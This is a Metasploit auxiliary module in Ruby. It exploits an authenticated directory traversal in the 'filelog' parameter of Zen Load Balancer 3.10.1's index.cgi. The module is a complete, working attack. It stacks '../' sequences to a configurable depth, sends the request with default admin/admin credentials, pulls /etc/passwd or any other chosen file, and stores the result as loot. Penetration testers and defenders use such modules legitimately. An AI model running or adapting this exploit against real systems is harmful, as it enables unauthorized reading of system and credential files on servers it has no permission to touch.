##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Zen Load Balancer Directory Traversal",
      'Description'    => %q{
          This module exploits a authenticated directory traversal vulnerability in zen load
          balancer v3.10.1. The flaw exists in 'index.cgi' not properly handling 'filelog='
          parameter which allows a malicious actor to load arbitrary file path.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Basim Alabdullah', # Vulnerability discovery
          'Dhiraj Mishra'     # Metasploit module
        ],
      'References'     =>
        [
          ['EDB', '48308']
        ],
      'DisclosureDate' => "Apr 10 2020"
    ))

    register_options(
      [
        Opt::RPORT(444),
        OptInt.new('DEPTH', [true, 'The max traversal depth', 16]),
        OptString.new('FILEPATH', [false, 'The name of the file to download', 'etc/passwd']),
        OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'admin']),
        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin']),
      ])
  end

  def run
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    traversal = "../" * datastore['DEPTH']
    begin
      res = send_request_raw({
        'method' => 'GET',
        'uri'    => "/index.cgi?id=2-3&filelog=#{traversal}#{datastore['FILEPATH']}&nlines=100&action=See+logs",
        'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])
      }, 25)
    rescue Rex::ConnectionRefused
      print_error("#{rhost}:#{rport} Could not connect.")
      return
    end

    if res
      if res.code == 200
        vprint_line(res.to_s)
        fname = File.basename(datastore['FILEPATH'])

        path = store_loot(
          'zenload.http',
          'text/plain',
          datastore['RHOST'],
          res.body,
          fname
        )
        print_good("File saved in: #{path}")
      elsif res.code == 401
        print_error("#{rhost}:#{rport} Authentication failed")
      elsif res.code == 404
        print_error("#{rhost}:#{rport} File not found")
      end
    else
      print_error("HTTP Response failed")
    end
  end
end
